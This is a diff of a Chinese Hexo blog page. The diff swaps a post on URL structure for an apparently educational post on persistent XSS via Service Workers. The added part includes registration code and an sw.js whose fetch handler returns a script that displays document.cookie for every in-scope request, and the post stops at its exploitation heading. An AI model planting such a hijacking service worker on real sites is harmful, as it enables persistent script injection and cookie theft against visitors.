@@ -9,7 +9,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    web解剖分析-1 |  Time
+    持久化XSS漏洞利用 |  Time
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -44,7 +44,7 @@
   <div id="app">
     <main class="content on">
       <section class="outer">
-  <article id="post-web解剖分析-1" class="article article-type-post" itemscope
+  <article id="post-持久化XSS漏洞利用" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
   <div class="article-inner">
@@ -52,7 +52,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  web解剖分析-1
+  持久化XSS漏洞利用
 </h1>
  
 
@@ -61,14 +61,10 @@
 
     
     <div class="article-meta">
-      <a href="/2021/01/27/web%E8%A7%A3%E5%89%96%E5%88%86%E6%9E%90-1/" class="article-date">
-  <time datetime="2021-01-27T02:52:44.000Z" itemprop="datePublished">2021-01-27</time>
+      <a href="/2021/02/04/%E6%8C%81%E4%B9%85%E5%8C%96XSS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="article-date">
+  <time datetime="2021-02-04T03:29:18.000Z" itemprop="datePublished">2021-02-04</time>
 </a>
       
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/WEB%E4%B9%8B%E5%9B%B0/">WEB之困</a>
-  </div>
-
       
       
 <div class="word_count">
@@ -76,7 +72,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">692</span>
+            <span class="post-count">464</span>
         </span>
     </span>
 
@@ -110,43 +106,39 @@
       
 
       
-      <p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3v26qzhmj31c00u0k0c.jpg" alt="29"></p>
+      <p>/img/x.jpg</p>
 <a id="more"></a>
 
 
 
-<h1 id="HTML历史"><a href="#HTML历史" class="headerlink" title="HTML历史"></a>HTML历史</h1><p>​        最早的通用标记语言是在20世纪60年由IBM公司开发的 GML (Generalized Markup Language  通用标记语言)，它用可供机器读取识别的指令作为文档的标识符，来明确表示那些是文档的头部，那些是列表项目等等。</p>
-<p>​        在此后经过20多年的发展逐渐演变成 SGML (Standard Generalized Markup Language 标准通用标记语言)，它把 GML 原来基于冒号和句号的语法改变成了我们现在熟悉的尖括号格式语法。</p>
-<p>​        而 SGML 就是 HTML (HyperText Markup Language 超文本标记语言)的前身，在经历 10 年后  HTML 便诞生了，随后根据 HTML 开发了 HTTP 协议(HyperText Transfer Protocol 超文本传输协议)。</p>
-<h1 id="一切从-URL-开始"><a href="#一切从-URL-开始" class="headerlink" title="一切从 URL 开始"></a>一切从 URL 开始</h1><blockquote>
-<p>URL (Uniform Resoure Locator )    统一资源定位器</p>
-</blockquote>
-<h3 id="URL-的结构"><a href="#URL-的结构" class="headerlink" title="URL 的结构"></a>URL 的结构</h3><ul>
-<li>协议名称</li>
-<li>层级URL的标记符号(固定不变)</li>
-<li>访问资源需要的凭证信息(可选项)</li>
-<li>从那个服务器获取的数据</li>
-<li>需要连接的端口号(可选项)</li>
-<li>指向资源的层级(文件路径)</li>
-<li>查询字符串(参数，[可选项])</li>
-<li>片段ID(可选项)</li>
+<h1 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h1><p>众所周知，XSS有反射型XSS、存储型XSS、DOM型XSS，而本文重点讲述的持久化XSS是属于存储型XSS中的漏洞利用</p>
+<h1 id="持久化XSS"><a href="#持久化XSS" class="headerlink" title="持久化XSS"></a>持久化XSS</h1><h2 id="0x00-Service-Worker"><a href="#0x00-Service-Worker" class="headerlink" title="0x00 Service Worker"></a>0x00 Service Worker</h2><p>Service Worker 是谷歌浏览器在2014年提出的 WEB API 用于WEB应用提供高级的可持续的后台处理工具。目前市面上主流浏览器都已支持该工具。详细来说Service Worker 就是JavaScript的API，运行于浏览器后台，不受页面刷新的影响，可以监听和拦截作用域范围内所有页面的 HTTP 请求。并提供离线功能。而对于安全界来说，可使用Service Worker进行持久化的XSS攻击。</p>
+<p>使用条件：</p>
+<ul>
+<li>HTTPS</li>
+<li>同源下的JS</li>
+<li>Content-Type必须是JS</li>
 </ul>
-<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3wnp5ueoj311q0hijvj.jpg" alt="image-20210129004909099"></p>
-<h4 id="协议名称"><a href="#协议名称" class="headerlink" title="协议名称"></a>协议名称</h4><p>例如：http、https、ftp等几十项都是协议名称，并且:结尾。<code>http:</code></p>
-<h4 id="层级-URL-的标记符号"><a href="#层级-URL-的标记符号" class="headerlink" title="层级 URL 的标记符号"></a>层级 URL 的标记符号</h4><p>使用固定字符串<code>//</code></p>
-<h4 id="访问资源的身份验证"><a href="#访问资源的身份验证" class="headerlink" title="访问资源的身份验证"></a>访问资源的身份验证</h4><p> URL 里身份验证的部分属于可选项，在向服务器端获取数据时有可能需要该位置指定一个用户名或密码。</p>
-<h4 id="服务器地址"><a href="#服务器地址" class="headerlink" title="服务器地址"></a>服务器地址</h4><p>对完整的层级 URL 来说，服务器地址部分必须指定一个不区分大小写的域名和一个IPV4的IP。</p>
-<h4 id="服务器端口"><a href="#服务器端口" class="headerlink" title="服务器端口"></a>服务器端口</h4><p>服务器端口部分是可选的，通常服务器连接的网络端口不是常用的标准端口时才会用到此部分。</p>
-<h4 id="层级文件路径"><a href="#层级文件路径" class="headerlink" title="层级文件路径"></a>层级文件路径</h4><p>URL 的下一个组成部分叫层级文件路径，用来获取服务器指定资源的方式。</p>
-<h4 id="查询字符串"><a href="#查询字符串" class="headerlink" title="查询字符串"></a>查询字符串</h4><p>可选项，用于把一串非层级格式的任意参数传递给前面路径所对面的资源 (把用户提供的信息传递给服务器端的脚本)</p>
-<h4 id="片段-ID"><a href="#片段-ID" class="headerlink" title="片段 ID"></a>片段 ID</h4><p>片段 ID 在浏览器在浏览器中指向HTML某个锚点名称，用于页面浏览的定位。</p>
-<h4 id="整合资源"><a href="#整合资源" class="headerlink" title="整合资源"></a>整合资源</h4><p>PS：懒得手敲。垃圾 WPS 不能复制，还要花钱。(穷是原罪)</p>
-<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3wnothasj311r0u0qkf.jpg" alt="image-20210129010402801"></p>
-<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3wnnarrdj310v0u07ms.jpg" alt="image-20210129010419943"></p>
-<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3wnmuyudj31e80ho7al.jpg" alt="image-20210129010437898"></p>
-<p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gn3wnny5vqj31ec0jijyp.jpg" alt="image-20210129010449225"></p>
-<h3 id="保留字符和百分号编码"><a href="#保留字符和百分号编码" class="headerlink" title="保留字符和百分号编码"></a>保留字符和百分号编码</h3><p>由于某些字符和百分号编码可能需要用到，所以RFC未禁用也未规定详细用法，所以会经常见到%2F、%00等字符，或者在测试中利用这些字符进行攻击等。(个人大概这样理解)</p>
+<p>本地调试可使用localhost和127.0.0.1。</p>
+<p>注册使用Service worker</p>
+<p>index.html</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">const</span> SERVICE_WORKER_API = <span class="string">'serviceWorker'</span>;</span><br><span class="line"><span class="keyword">const</span> SERVICE_WORKER_FILE_PATH = <span class="string">'/xss/sw.js'</span>;<span class="comment">//service worker文件路径</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> isSupportServiceWorker = <span class="function"><span class="params">()</span> =&gt;</span> SERVICE_WORKER_API <span class="keyword">in</span> navigator;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (isSupportServiceWorker()) &#123;</span><br><span class="line">    navigator</span><br><span class="line">        .serviceWorker</span><br><span class="line">        .register(SERVICE_WORKER_FILE_PATH)</span><br><span class="line">        .then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'Load service worker Success.'</span>));<span class="comment">//注册成功返回提示</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.info(<span class="string">'Browser not support Service Worker.'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line"> </span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
 
+<p>sw.js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//监控install事件</span></span><br><span class="line">self.addEventListener(<span class="string">'install'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"install"</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 当serviceWorker注册之后，会首先安装一下。再次加载时，如果serviceWorker有更新，则会重新下载安装serviceWorker，否则不会安装。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//监控activate事件</span></span><br><span class="line">self.addEventListener(<span class="string">'activate'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"activate"</span>)</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment">//监控fetch事件</span></span><br><span class="line">self.addEventListener(<span class="string">'fetch'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    event.respondWith(<span class="keyword">new</span> Response(<span class="string">'&lt;script&gt;alert(document.cookie)&lt;/script&gt;'</span>, &#123;<span class="attr">headers</span>: &#123;<span class="string">'Content-Type'</span>: <span class="string">"text/html"</span>&#125;&#125;))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>注册成功</p>
+<p>![image-20210222010617968](../../../Library/Application Support/typora-user-images/image-20210222010617968.png)</p>
+<blockquote>
+<p>chrome://serviceworker-internals/?devtools   //查看是否注册成功</p>
+</blockquote>
+<p>![image-20210222011237971](../../../Library/Application Support/typora-user-images/image-20210222011237971.png)</p>
+<blockquote>
+<p>chrome://inspect/#service-workers </p>
+</blockquote>
+<p>![image-20210222011157073](../../../Library/Application Support/typora-user-images/image-20210222011157073.png)</p>
+<p>以上几种均可查看Service Worker是否注册成功</p>
+<h3 id="Service-Worker-XSS-利用"><a href="#Service-Worker-XSS-利用" class="headerlink" title="Service Worker XSS 利用"></a>Service Worker XSS 利用</h3>
       
       <!-- reward -->
       
@@ -210,7 +202,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://timeshu.github.io/2021/01/27/web%E8%A7%A3%E5%89%96%E5%88%86%E6%9E%90-1/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://timeshu.github.io/2021/02/04/%E6%8C%81%E4%B9%85%E5%8C%96XSS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -226,19 +218,19 @@
   
   <nav class="article-nav">
     
-      <a href="/2021/02/04/%E6%8C%81%E4%B9%85%E5%8C%96XSS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="article-nav-link">
+      <a href="/2021/06/13/HackTheBox-Archetype-1/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            持久化XSS漏洞利用
+            HackTheBox-Archetype-1
           
         </div>
       </a>
     
     
-      <a href="/2021/01/26/docker%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0(%E4%B8%80)/" class="article-nav-link">
+      <a href="/2021/01/27/web%E8%A7%A3%E5%89%96%E5%88%86%E6%9E%90-1/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">docker进阶学习(一)</div>
+        <div class="article-nav-title">web解剖分析-1</div>
       </a>
     
   </nav>
